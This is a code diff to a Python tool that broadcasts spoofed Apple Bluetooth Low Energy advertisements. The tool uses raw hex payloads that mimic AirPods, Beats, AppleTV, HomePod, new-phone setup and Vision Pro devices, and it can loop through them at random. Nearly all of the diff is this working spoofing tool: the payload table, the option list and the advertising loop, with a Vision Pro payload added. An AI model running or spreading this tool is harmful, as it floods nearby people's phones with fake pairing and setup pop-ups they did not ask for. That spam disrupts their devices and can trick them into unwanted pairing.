@@ -8,6 +8,8 @@ import bluetooth._bluetooth as bluez
 from time import sleep
 from utils.bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising
 
+SLEEP_TIME = 4
+
 # Add a docstring to describe the purpose of the script
 help_desc = '''
 
@@ -20,36 +22,61 @@ Based on the previous work of chipik / _hexway
 '''
 
 # Define different bt_data options and their corresponding descriptions
+# bt_data_options = {
+#     1: "Airpods",
+#     2: "Airpods Pro",
+#     3: "Airpods Max",
+#     4: "Airpods Gen 2",
+#     5: "Airpods Gen 3",
+#     6: "Airpods Pro Gen 2",
+#     7: "PowerBeats",
+#     8: "PowerBeats Pro",
+#     9: "Beats Solo Pro",
+#     10: "Beats Studio Buds",
+#     11: "Beats Flex",
+#     12: "BeatsX",
+#     13: "Beats Solo3",
+#     14: "Beats Studio3",
+#     15: "Beats Studio Pro",
+#     16: "Beats Fit Pro",
+#     17: "Beats Studio Buds+",
+#     18: "AppleTV Setup",
+#     19: "AppleTV Pair",
+#     20: "AppleTV New User",
+#     21: "AppleTV AppleID Setup",
+#     22: "AppleTV Wireless Audio Sync",
+#     23: "AppleTV Homekit Setup",
+#     24: "AppleTV Keyboard",
+#     25: "AppleTV 'Connecting to Network'",
+#     26: "Homepod Setup",
+#     27: "Setup New Phone",
+#     28: "Transfer Number to New Phone",
+#     29: "TV Color Balance",
+#     30: "Vision Pro"
+
+#     # Add more options as needed
+# }
+
+
 bt_data_options = {
     1: "Airpods",
     2: "Airpods Pro",
-    3: "Airpods Max",
     4: "Airpods Gen 2",
     5: "Airpods Gen 3",
-    6: "Airpods Pro Gen 2",
-    7: "PowerBeats",
     8: "PowerBeats Pro",
-    9: "Beats Solo Pro",
     10: "Beats Studio Buds",
-    11: "Beats Flex",
-    12: "BeatsX",
-    13: "Beats Solo3",
-    14: "Beats Studio3",
-    15: "Beats Studio Pro",
     16: "Beats Fit Pro",
-    17: "Beats Studio Buds+",
-    18: "AppleTV Setup",
     19: "AppleTV Pair",
     20: "AppleTV New User",
     21: "AppleTV AppleID Setup",
     22: "AppleTV Wireless Audio Sync",
     23: "AppleTV Homekit Setup",
     24: "AppleTV Keyboard",
-    25: "AppleTV 'Connecting to Network'",
     26: "Homepod Setup",
     27: "Setup New Phone",
     28: "Transfer Number to New Phone",
-    29: "TV Color Balance"
+    29: "TV Color Balance",
+    30: "Vision Pro"
 
     # Add more options as needed
 }
@@ -85,21 +112,28 @@ hex_data = {
     27: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
     28: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
     29: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
+    30: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
     # Add More as needed
 }
 
+
 def main():
-    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval (default 200))')
-    parser.add_argument('-d', '--data', type=int, help='Select a message to send (e.g., -d 1)')
-    
+    parser = argparse.ArgumentParser(
+        description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-i', '--interval', default=200,
+                        type=int, help='Advertising interval (default 200))')
+    parser.add_argument('-d', '--data', type=int,
+                        help='Select a message to send (e.g., -d 1)')
+
     # Add random argument
-    parser.add_argument('-r', '--random', action='store_true', help='Randomly loop through advertising data')
-    
+    parser.add_argument('-r', '--random', action='store_true',
+                        help='Randomly loop through advertising data')
+
     args = parser.parse_args()
 
     if args.data is None and not args.random:
-        print("Please select a message option using -d or use --random for random selection.")
+        print(
+            "Please select a message option using -d or use --random for random selection.")
         print("Available message options:")
         for option, description in bt_data_options.items():
             print(f"{option}: {description}")
@@ -111,9 +145,9 @@ def main():
         for option, description in bt_data_options.items():
             print(f"{option}: {description}")
         return
-    
+
     # the default Bluetooth device is hci0
-    dev_id = 0 
+    dev_id = 0
     toggle_device(dev_id, True)
 
     try:
@@ -128,22 +162,25 @@ def main():
         if args.random:
             while True:
                 selected_option = random.choice(list(bt_data_options.keys()))
+                print(f"{selected_option},{bt_data_options[selected_option]}")
                 bt_data = hex_data.get(selected_option)
-                start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
-                sleep(2)
+                start_le_advertising(
+                    sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
+                sleep(SLEEP_TIME)
                 stop_le_advertising(sock)
         else:
             selected_option = args.data
             bt_data = hex_data.get(selected_option)
-            start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
+            start_le_advertising(
+                sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
             while True:
-                sleep(2)
+                sleep(SLEEP_TIME)
     except KeyboardInterrupt:
         stop_le_advertising(sock)
     except Exception as e:
         print(f"An error occurred: {e}")
         stop_le_advertising(sock)
 
+
 if __name__ == "__main__":
     main()
-
